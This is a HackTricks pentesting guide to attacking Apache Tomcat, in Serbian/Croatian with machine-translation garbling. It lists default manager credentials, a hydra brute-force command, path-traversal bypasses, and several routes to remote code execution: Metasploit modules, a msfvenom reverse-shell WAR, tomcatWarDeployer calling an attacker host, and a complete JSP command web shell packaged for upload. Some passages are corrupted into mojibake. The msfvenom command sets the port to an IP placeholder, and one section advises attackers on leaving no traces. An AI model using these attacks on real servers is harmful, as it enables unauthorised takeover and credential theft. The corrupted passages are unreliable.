# Tomcat

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? 콯elite li da vidite **va코u kompaniju reklamiranu na HackTricks-u**? Ili 쬰lite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridru쬴te se** [**游눫**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 游냕[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Prona캠ite najva쬹ije ranjivosti kako biste ih br쬰 popravili. Intruder prati va코u povr코inu napada, pokre캖e proaktivno skeniranje pretnji, pronalazi probleme u celokupnom tehnolo코kom sklopu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte ga besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Otkrivanje

* Obi캜no se pokre캖e na **portu 8080**
* **Uobi캜ajena Tomcat gre코ka:**

<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

## Enumeracija

### **Identifikacija verzije**
Da biste prona코li verziju Apache Tomcat-a, mo쬰 se izvr코iti jednostavna komanda:
```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```
Ovo 캖e pretra쬴ti termin "Tomcat" na stranici indeksa dokumentacije, otkrivaju캖i verziju u oznaci naslova HTML odgovora.

### **Lokacija datoteka upravitelja**
Identifikacija ta캜nih lokacija direktorijuma **`/manager`** i **`/host-manager`** je klju캜na jer se njihova imena mogu promeniti. Preporu캜uje se pretraga metodom brute-force kako bi se prona코le ove stranice.

### **Enumeracija korisni캜kih imena**
Za Tomcat verzije starije od 6, mogu캖e je enumerisati korisni캜ka imena putem:
```bash
msf> use auxiliary/scanner/http/tomcat_enum
```
### **Podrazumevane akreditacije**
Direktorijum **`/manager/html`** je posebno osetljiv jer omogu캖ava otpremanje i implementaciju WAR fajlova, 코to mo쬰 dovesti do izvr코avanja koda. Ovaj direktorijum je za코ti캖en osnovnom HTTP autentifikacijom, a uobi캜ajene akreditacije su:
- admin:admin
- tomcat:tomcat
- admin:<NITA>
- admin:s3cr3t
- tomcat:s3cr3t
- admin:tomcat

Ove akreditacije se mogu testirati kori코캖enjem:
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
Jo코 jedan zna캜ajan direktorijum je **`/manager/status`**, koji prikazuje verziju Tomcat-a i operativnog sistema, 코to poma쬰 u identifikaciji ranjivosti.

### **Napad brute force**
Da biste poku코ali napad brute force na direktorijum manager, mo쬰te koristiti:
```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```
## Uz pode코avanje razli캜itih parametara u Metasploitu za ciljanje odre캠enog hosta.

## Uobi캜ajene ranjivosti

### **Otkrivanje lozinke u tragovima unazad**
Pristup `/auth.jsp` mo쬰 otkriti lozinku u tragovima unazad u povoljnim okolnostima.

### **Dvostruko kodiranje URL-a**
Ranjivost CVE-2007-1860 u `mod_jk` omogu캖ava dvostruko kodiranje URL-a za prolazak putem putanje, omogu캖avaju캖i neovla코캖en pristup upravlja캜kom interfejsu putem posebno kreiranog URL-a.

Da biste pristupili upravlja캜kom vebu Tomcat-a, idite na: `pathTomcat/%252E%252E/manager/html`

### /examples
Apache Tomcat verzije 4.x do 7.x uklju캜uju primere skripti koje su podlo쬹e otkrivanju informacija i napadima preko skripti sa ugra캠enim skriptama (XSS). Ove skripte, koje su sveobuhvatno navedene, treba proveriti radi neovla코캖enog pristupa i potencijalne zloupotrebe. Prona캠ite [vi코e informacija ovde](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

* /examples/jsp/num/numguess.jsp
* /examples/jsp/dates/date.jsp
* /examples/jsp/snp/snoop.jsp
* /examples/jsp/error/error.html
* /examples/jsp/sessions/carts.html
* /examples/jsp/checkbox/check.html
* /examples/jsp/colors/colors.html
* /examples/jsp/cal/login.html
* /examples/jsp/include/include.jsp
* /examples/jsp/forward/forward.jsp
* /examples/jsp/plugin/plugin.jsp
* /examples/jsp/jsptoserv/jsptoservlet.jsp
* /examples/jsp/simpletag/foo.jsp
* /examples/jsp/mail/sendmail.jsp
* /examples/servlet/HelloWorldExample
* /examples/servlet/RequestInfoExample
* /examples/servlet/RequestHeaderExample
* /examples/servlet/RequestParamExample
* /examples/servlet/CookieExample
* /examples/servlet/JndiServlet
* /examples/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### **Exploit putanje prolaska**
U nekim [**ranjivim konfiguracijama Tomcat-a**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/) mo쬰te dobiti pristup za코ti캖enim direktorijumima u Tomcat-u koriste캖i putanju: `/..;/`

Na primer, mo쬯a 캖ete mo캖i **pristupiti stranici upravlja캜a Tomcat-a** pristupanjem: `www.vulnerable.com/lalala/..;/manager/html`

**Jo코 jedan na캜in** za zaobila쬰nje za코ti캖enih putanja kori코캖enjem ovog trika je pristup `http://www.vulnerable.com/;param=value/manager/html`


## RCE (Izvr코enje udaljenog koda)

Na kraju, ako imate pristup Tomcat Web Application Manageru, mo쬰te **otpakovati i implementirati .war datoteku (izvr코iti kod)**.

### Ograni캜enja

Mo캖i 캖ete implementirati WAR samo ako imate **dovoljno privilegija** (uloge: **admin**, **manager** i **manager-script**). Detalji se mogu prona캖i u datoteci _tomcat-users.xml_, obi캜no definisanoj u `/usr/share/tomcat9/etc/tomcat-users.xml` (varira izme캠u verzija) (vidi [POST ](tomcat.md#post)sekciju).
```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```
### Metasploit

Metasploit je popularan alat za testiranje penetracije koji se 캜esto koristi za iskori코캖avanje ranjivosti u mre쬹im servisima. Ovaj alat pru쬬 코irok spektar modula i eksploita koji omogu캖avaju hakerima da izvr코e napade na ciljane sisteme. Metasploit tako캠e pru쬬 mogu캖nost izrade i prilago캠avanja sopstvenih modula za napade.

Da biste koristili Metasploit, prvo morate da instalirate Metasploit Framework na va코em ra캜unaru. Nakon instalacije, mo쬰te koristiti Metasploit komandnu liniju ili grafi캜ki korisni캜ki interfejs (GUI) za izvr코avanje napada.

Metasploit ima veliku bazu podataka ranjivosti i eksploita, koja se redovno a쬿rira. Ova baza podataka omogu캖ava hakerima da brzo prona캠u i iskoriste ranjivosti u ciljanim sistemima. Metasploit tako캠e podr쬬va automatizaciju napada, 코to olak코ava izvr코avanje napada u velikom obimu.

Kada koristite Metasploit, va쬹o je da imate dozvolu za testiranje penetracije na ciljanim sistemima. Neovla코캖eno kori코캖enje Metasploita mo쬰 biti ilegalno i podle쬰 zakonskim sankcijama. Uvek se pridr쬬vajte eti캜kih smernica i zakona prilikom kori코캖enja ovog alata.
```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```
### MSFVenom Reverse Shell

1. Kreirajte war datoteku za implementaciju:
```bash
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```
2. 뤰햣햪햦혝햣 `revshell.war` 햢햟혝쮐햣햨혞 햦 햦혜혝혞햦혝햣 혲쮐 (`/revshell/`):

### 뉋왏햦쒫썜뛣 햦 햣쒫왐향햫햦 혣햣햩 혜햟 [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer)

햒 햫햣햨햦햪 혜혡햣햫햟햦혲햦햪햟 쮏쒫 햫햣 혟혞햫햨혡햦쮏쫧쟴걣 (햫햟 햦햪햣, 혜혝햟햣 쒫왐향햦혲햣 sun)

#### 햣혞향햦햪햟혴햣
```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```
#### Obrnuti shell

Obrnuti shell je tehnika koja omogu캖ava hakeru da preuzme kontrolu nad udaljenim ra캜unarom putem mre쬰. Ova tehnika se 캜esto koristi tokom testiranja penetracije kako bi se dobila daljinska kontrola nad ciljnim sistemom.

Da biste uspostavili obrnuti shell, prvo morate postaviti "slu코aju캖i" server na va코em ra캜unaru. Zatim, na ciljnom ra캜unaru, morate pokrenuti "shell" koji 캖e se povezati sa va코im serverom. Kada se veza uspostavi, mo쬰te izvr코avati komande na ciljnom ra캜unaru kao da ste fizi캜ki prisutni na njemu.

Obrnuti shell mo쬰 biti veoma koristan tokom testiranja penetracije, jer vam omogu캖ava da istra쬿jete i manipuli코ete ciljnim sistemom sa udaljene lokacije. Me캠utim, va쬹o je napomenuti da je upotreba obrnutog 코ela bez dozvole vlasnika sistema ilegalna i mo쬰 imati ozbiljne pravne posledice.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```
#### Bind shell

Bind shell (Veza na 캜ekanju) je vrsta udaljenog pristupa koja omogu캖ava napada캜u da uspostavi vezu sa ciljnim ra캜unarom i preuzme kontrolu nad njim. Kada se bind shell aktivira na ciljnom ra캜unaru, on 캜eka na dolaznu vezu od napada캜a. Kada se veza uspostavi, napada캜 mo쬰 izvr코avati komande na ciljnom ra캜unaru i pristupiti njegovim resursima.

Da bi se uspostavila bind shell veza, napada캜 mora imati pristup ciljnom ra캜unaru i instalirati bind shell program na njemu. Ovaj program slu코a na odre캠enom portu i 캜eka na dolazne veze. Kada napada캜 uspostavi vezu sa ciljnim ra캜unarom, on postaje aktivna sesija koju napada캜 mo쬰 koristiti za izvr코avanje komandi i manipulaciju ciljnim ra캜unarom.

Bind shell je 캜esto kori코캖en u napadima na web servere, kao 코to je Apache Tomcat. Napada캜 mo쬰 iskoristiti ranjivost u Tomcatu da bi instalirao bind shell program na serveru i preuzeo kontrolu nad njim. Ovo mu omogu캖ava da izvr코ava komande na serveru, pristupa fajlovima i bazama podataka, i izvr코ava druge zlonamerne aktivnosti.

Kada se koristi bind shell, va쬹o je da napada캜 bude oprezan i ne ostavi tragove na ciljnom ra캜unaru. Tako캠e, ciljani sistem mo쬰 biti za코ti캖en firewall-om ili drugim sigurnosnim mehanizmima koji mogu blokirati dolazne veze na odre캠enim portovima. Napada캜 mora biti svestan ovih ograni캜enja i prilagoditi svoje metode napada kako bi ih zaobi코ao.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```
### Kori코캖enje [Culsterd](https://github.com/hatRiot/clusterd)
```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```
### Ru캜na metoda - Web shell

Kreirajte **index.jsp** sa ovim [sadr쬬jem](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp):
```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```
Tako캠e mo쬰te instalirati ovo (omogu캖ava otpremanje, preuzimanje i izvr코avanje komandi): [http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html)

### Ru캜na metoda 2

Preuzmite JSP web shell kao 코to je [ovaj](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) i kreirajte WAR datoteku:
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```
## POST

Ime datoteke sa Tomcat akreditacijama je _tomcat-users.xml_
```bash
find / -name tomcat-users.xml 2>/dev/null
```
Drugi na캜ini za prikupljanje Tomcat akreditacija:
```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```
## Ostali alati za skeniranje Tomcat-a

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

## Reference
* [https://github.com/simran-sankhala/Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat)
* [https://hackertarget.com/sample/nexpose-metasploitable-test.pdf](https://hackertarget.com/sample/nexpose-metasploitable-test.pdf)


<details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Prona캠ite najva쬹ije ranjivosti kako biste ih br쬰 popravili. Intruder prati va코u povr코inu napada, pokre캖e proaktivno skeniranje prijetnji, pronalazi probleme u cijelom va코em tehnolo코kom sklopu, od API-ja do web aplikacija i oblak sustava. [**Isprobajte ga besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<summary><strong>Nau캜ite hakiranje AWS-a od nule do heroja s</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Radite li u **cybersecurity tvrtki**? 콯elite li vidjeti **ogla코avanje svoje tvrtke na HackTricks-u**? Ili 쬰lite imati pristup **najnovijoj verziji PEASS-a ili preuzeti HackTricks u PDF-u**? Provjerite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**slu쬭eni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridru쬴te se** [**游눫**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 游냕[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podijelite svoje hakiraju캖e trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
